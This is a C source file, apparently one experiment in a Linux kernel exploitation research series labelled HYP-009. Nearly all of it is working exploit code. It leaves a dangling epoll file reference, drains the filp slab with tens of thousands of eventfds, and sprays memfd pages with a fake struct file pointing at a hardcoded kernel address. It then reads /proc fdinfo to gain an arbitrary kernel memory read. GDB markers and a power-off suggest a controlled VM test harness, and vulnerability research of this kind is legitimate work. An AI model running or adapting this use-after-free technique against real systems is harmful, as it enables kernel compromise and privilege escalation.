// test_hyp009.c — HYP-009: Adjudicate natural survivor mechanism (H-b) + win the reclaim
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <pthread.h>
#include <errno.h>

#define NUM_WORKERS 40
#define FILES_PER_WORKER 800   // 40 * 800 = 32,000 files (filp slab drain)
#define NUM_SPRAY_PAGES 4096   // 4096 * 4KB = 16MB buddy page spray
#define NUM_ENCLOSING 32

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

// Markers for GDB automation
void marker_setup_done(int epA_fd, int inner_fd) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-009] MARKER: setup_done epA=%d inner=%d\n", epA_fd, inner_fd);
    print_str(buf);
}

void marker_close_started(void) {
    print_str("[HYP-009] MARKER: close_started\n");
}

void marker_close_done(void) {
    print_str("[HYP-009] MARKER: close_done\n");
}

void marker_spray_started(void) {
    print_str("[HYP-009] MARKER: spray_started\n");
}

void marker_spray_done(void) {
    print_str("[HYP-009] MARKER: spray_done\n");
}

void marker_experiment_complete(int success) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-009] MARKER: experiment_complete status=%d\n", success);
    print_str(buf);
}

static int read_fdinfo_ino(int epfd, char *out_buf, size_t max_len, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(out_buf, max_len, "ERR_OPEN_%d", errno);
        return -1;
    }
    int n = read(fd, out_buf, max_len - 1);
    close(fd);
    if (n <= 0) {
        snprintf(out_buf, max_len, "ERR_READ_%d", errno);
        return -1;
    }
    out_buf[n] = '\0';

    // Parse the ino from the "tfd:" line (to avoid matching the header ino: line)
    char *tfd_str = strstr(out_buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    return -2;
}

int main(int argc, char **argv) {
    print_str("====================================================\n");
    print_str("=== HYP-009: Natural Survivor Adjudication + AAR ===\n");
    print_str("====================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));

    int ready_pipe[2];
    int release_pipe[2];
    if (pipe(ready_pipe) < 0 || pipe(release_pipe) < 0) {
        perror("[!] pipe failed");
        exit(1);
    }

    pid_t pids[NUM_WORKERS];
    print_str("[*] Pre-filling and priming filp slabs (32,000 files across 40 workers)...\n");
    for (int i = 0; i < NUM_WORKERS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(ready_pipe[0]);
            close(release_pipe[1]);

            int fds[FILES_PER_WORKER];
            for (int j = 0; j < FILES_PER_WORKER; j++) {
                fds[j] = eventfd(0, 0);
            }
            char ready = 'R';
            write(ready_pipe[1], &ready, 1);
            close(ready_pipe[1]);

            char go;
            read(release_pipe[0], &go, 1);
            close(release_pipe[0]);

            for (int j = 0; j < FILES_PER_WORKER; j++) {
                if (fds[j] >= 0) close(fds[j]);
            }
            exit(0);
        }
        pids[i] = p;
    }

    close(ready_pipe[1]);
    close(release_pipe[0]);

    // Wait for all workers to prime slabs
    for (int i = 0; i < NUM_WORKERS; i++) {
        char dummy;
        read(ready_pipe[0], &dummy, 1);
    }
    close(ready_pipe[0]);
    print_str("[+] Filp slab cache primed with 32,000 active objects.\n");

    // Step 1: Create epA and slab enclosing files
    int epA = epoll_create1(0);
    if (epA < 0) {
        perror("[!] epoll_create1 epA failed");
        exit(1);
    }

    int enclosing_fds[NUM_ENCLOSING];
    for (int i = 0; i < NUM_ENCLOSING / 2; i++) {
        enclosing_fds[i] = open("/dev/null", O_RDONLY);
    }

    // Target inner file: an epoll fd (victim struct file in filp slab)
    int inner = epoll_create1(0);
    if (inner < 0) {
        perror("[!] epoll_create1 inner failed");
        exit(1);
    }

    for (int i = NUM_ENCLOSING / 2; i < NUM_ENCLOSING; i++) {
        enclosing_fds[i] = open("/dev/null", O_RDONLY);
    }

    struct stat st;
    fstat(inner, &st);
    char buf[256];
    snprintf(buf, sizeof(buf), "[*] Created epA=%d, inner=%d (orig inode=0x%lx)\n",
             epA, inner, (unsigned long)st.st_ino);
    print_str(buf);

    // Watch inner in epA
    struct epoll_event evA = { .events = EPOLLIN | EPOLLOUT, .data.fd = inner };
    if (epoll_ctl(epA, EPOLL_CTL_ADD, inner, &evA) < 0) {
        perror("[!] epoll_ctl ADD epA failed");
        exit(1);
    }

    marker_setup_done(epA, inner);

    // Step 2-3: Close inner fd (Thread B close path)
    marker_close_started();
    close(inner);
    marker_close_done();

    // Close enclosing files to empty the victim's slab page
    for (int i = 0; i < NUM_ENCLOSING; i++) {
        if (enclosing_fds[i] >= 0) {
            close(enclosing_fds[i]);
            enclosing_fds[i] = -1;
        }
    }

    // Step 4: Signal workers to mass-free all 32,000 files and drain filp slabs to buddy
    marker_spray_started();
    print_str("[*] Signaling 40 workers to mass-free 32,000 files (triggering full slab drain)...\n");
    char go = 'G';
    for (int i = 0; i < NUM_WORKERS; i++) {
        write(release_pipe[1], &go, 1);
    }
    close(release_pipe[1]);

    for (int i = 0; i < NUM_WORKERS; i++) {
        waitpid(pids[i], NULL, 0);
    }
    print_str("[*] All workers terminated. Waiting 2.0s for RCU grace period and SLUB buddy reclaim...\n");
    sleep(2);

    // Step 5: Spray order-0 buddy pages via memfd_create
    void *maps[NUM_SPRAY_PAGES];
    uint64_t fake_inode_addr = 0xffffffc00a0cc6d8ULL; // init_task + offsetof(comm) - offsetof(i_ino)

    print_str("[*] Spraying 4096 memfd pages (16MB) with replicated fake struct file...\n");
    for (int i = 0; i < NUM_SPRAY_PAGES; i++) {
        int mfd = memfd_create("spray", MFD_CLOEXEC);
        if (mfd < 0) continue;
        ftruncate(mfd, 4096);
        maps[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
        close(mfd); // fd closed, mmap mapping persists
        if (maps[i] == MAP_FAILED) continue;

        // Replicate fake struct file at every 256-byte slot offset (16 slots per 4K page)
        for (int slot = 0; slot < 4096; slot += 256) {
            uint8_t *slot_ptr = (uint8_t *)maps[i] + slot;
            memset(slot_ptr, 0, 256);
            // f_inode is at offset 32 (0x20)
            *(uint64_t *)(slot_ptr + 32) = fake_inode_addr;
            // f_pos is at offset 104 (0x68)
            *(uint64_t *)(slot_ptr + 104) = 0;
            // f_flags
            *(uint32_t *)(slot_ptr + 64) = 0;
        }
    }
    marker_spray_done();

    // Step 6: Read /proc/self/fdinfo/<epA> (AAR attempt through sprayed fake struct file)
    char spray_fdinfo_buf[512] = {0};
    unsigned long spray_ino = 0;
    int res = read_fdinfo_ino(epA, spray_fdinfo_buf, sizeof(spray_fdinfo_buf), &spray_ino);

    snprintf(buf, sizeof(buf), "[*] AAR Spray read (res=%d, item ino=0x%lx):\n%s\n",
             res, spray_ino, spray_fdinfo_buf);
    print_str(buf);

    // Target comm for init_task is "swapper\0" -> 0x0072657070617773
    int success = 0;
    if (spray_ino == 0x0072657070617773ULL || spray_ino == 0x2f72657070617773ULL ||
        strstr(spray_fdinfo_buf, "72657070617773")) {
        print_str("[+] ========================================================\n");
        print_str("[+] SUCCESS: AAR Reclaim Won! ino matched swapper comm (0x72657070617773)\n");
        print_str("[+] ========================================================\n");
        success = 1;
    } else {
        snprintf(buf, sizeof(buf), "[*] Result: item spray_ino=0x%lx (expected 0x72657070617773 / 'swapper')\n", spray_ino);
        print_str(buf);
        if (res == 0) {
            print_str("[*] PARTIAL (Oracle Safety Confirmed): Read executed through non-reclaimed slab slot without kernel crash/panic.\n");
            success = 2;
        } else {
            print_str("[-] Error during fdinfo read\n");
            success = 0;
        }
    }

    marker_experiment_complete(success);

    print_str("[*] Test finished. Powering off safely.\n");
    reboot(RB_POWER_OFF);
    return 0;
}
